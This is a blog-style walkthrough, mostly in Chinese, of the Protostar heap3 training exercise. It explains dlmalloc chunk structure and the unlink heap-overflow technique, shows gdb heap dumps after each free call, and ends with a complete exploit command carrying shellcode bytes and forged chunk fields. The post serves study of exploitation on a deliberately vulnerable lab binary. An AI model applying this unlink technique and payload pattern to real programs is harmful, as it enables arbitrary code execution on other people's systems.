---
layout: post
title: Protostar教程之unlink
excerpt: "heap漏洞之unlink"
categories: [Protostar系列教程]
comments: true
---

参考地址:https://secinject.wordpress.com/2018/01/18/protostar-heap3/

漏洞代码如下
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
 
void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}
 
int main(int argc, char **argv)
{
  char *a, *b, *c;
 
  a = malloc(32);
  b = malloc(32);
  c = malloc(32);
 
  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);
 
  free(c);
  free(b);
  free(a);
 
  printf("dynamite failed?\n");
}
```
我们的目标是运行winner function

首先我们看一下分配的堆块与空闲的堆块

![Image text](https://raw.githubusercontent.com/snappyJack/snappyjack.github.io/master/img/Protostar教程之unlink_1.png)

 As a short reminder: dlmalloc keeps free chunks (chunks available for allocation) in a doubly linked list of chunks (right side of Image 1). Each free chunk has fields representing:

free chunk各个字段的意义:

- Prev_size: 如果前一个chunk的状态是allocated, 那么这个字段代表它(前一个chunk)的大小.
- Size: free chunk的大小
- FD pointer: 存放doubly linked list的指针指向下一个free chunk
- BK pointer: 存放doubly linked list的指针指向上一个free chunk
- Unused space: 如果该chunk被分配,那么这块区域存放数据
- Size: chunk的大小, this field is used for easier merging of chunks.

同样,allocated chunk各个字段的意义:

- Previous size: If previous chunk is allocated this field represents last 4 bytes of that chunk. If previous chunk is free, this field represents the size of that chunk.
- Size: Size of this chunk including chunk metadata (header). Last bit of this chunk (called P or “prev_inuse” bit) indicates if the previous chunk is in use or not.
- User data: Space available for user data.
 
Important thing to note here are the relations between those two chunk types: Imagine you have a user allocated chunk of memory which looks as the left side of Image 1. If we convert this chunk into a free chunk type (right side of Image 1), the first 8 bytes of “User data” will be represented as FD and BK pointers of the free chunk. We will need this later because it is crucial for our exploit.
```
内存中数据的样子          | 
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"a" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"b" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"c" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
TOP CHUNK                 |
--------------------------|
...                       |
--------------------------|
STACK                     |
--------------------------|
c                         |
--------------------------|
b                         |
--------------------------|
a                         |
--------------------------|
```
### 重点：
What will happen here when free(c) gets called is the following: The program will see that the “c” chunk’s size field is set to 0xfffffffc which represents -4 and because it is an even value, it will think the previous chunk is free. Then, by Image 5, line 4, it will navigate to the previous free chunk by subtracting its prev_size field (0xfffffff8 = -8) from the start of “c” chunk pointer and thus actually adding +8 and moving into the “c” chunk by 8 bytes, arriving at the beginning of the memory allocated by malloc(c). We can then forge an “virtual” chunk inside the chunk “c”‘s “User data” field which will be interpreted as a free chunk and unlinked. This looks like this:
```
内存中数据的样子          | 
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"a" allocated space [32B] |
--------------------------|
prev_size [4B]            | 
--------------------------|
size [4B]                 | 
--------------------------|
"b" allocated space [32B] |
--------------------------|
0xfffffff8                |
--------------------------|
0xfffffffc                | 
--------------------------|
cccc                      |
--------------------------|
cccc                      | 
--------------------------|
redir_addr -12            | 
--------------------------|
winner_addr               |
--------------------------|
```
The “CCCCCCCC” bytes represent fake prev_size and size bytes in the fake chunk made inside the “c” chunk “User data” space after which (redir_addr – 12) and winner_addr are located, which represend FD and BK because the fake chunk is considered free.

free前堆中的情况：
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x62626262	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x63636363	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(c)
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x62626262	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(b)
```bash
0x804b000:	0x00000000	0x00000029	0x61616161	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x0804b050	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```
free(a)
```bash
0x804b000:	0x00000000	0x00000029	0x0804b028	0x61616161
0x804b010:	0x61616161	0x00000000	0x00000000	0x00000000
0x804b020:	0x00000000	0x00000000	0x00000000	0x00000029
0x804b030:	0x0804b050	0x62626262	0x62626262	0x00000000
0x804b040:	0x00000000	0x00000000	0x00000000	0x00000000
0x804b050:	0x00000000	0x00000029	0x00000000	0x63636363
0x804b060:	0x63636363	0x00000000	0x00000000	0x00000000
0x804b070:	0x00000000	0x00000000	0x00000000	0x00020f89
0x804b080:	0x00000000	0x00000000	0x00000000	0x00000000
```

最终pwn代码：
```
./heap3 `python -c 'print "A"*16 + "\xb8\x64\x88\x04\x08\xff\xe0"'` `python -c 'print "A"*32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff"'` `python -c 'print "B"*8 + "\x1c\xb1\x04\x08" + "\x18\xc0\x04\x08"'`
```